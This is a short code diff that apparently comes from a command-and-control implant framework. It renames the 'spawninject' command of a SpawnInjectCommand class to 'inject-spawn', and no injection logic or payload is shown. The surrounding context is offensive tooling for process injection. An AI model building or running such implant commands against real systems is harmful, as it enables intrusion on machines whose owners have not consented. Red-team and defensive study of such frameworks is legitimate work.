@@ -12,7 +12,7 @@ namespace Agent.Commands
 {
     public class SpawnInjectCommand : AgentCommand
     {
-        public override string Name => "spawninject";
+        public override string Name => "inject-spawn";
 
         public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
         {
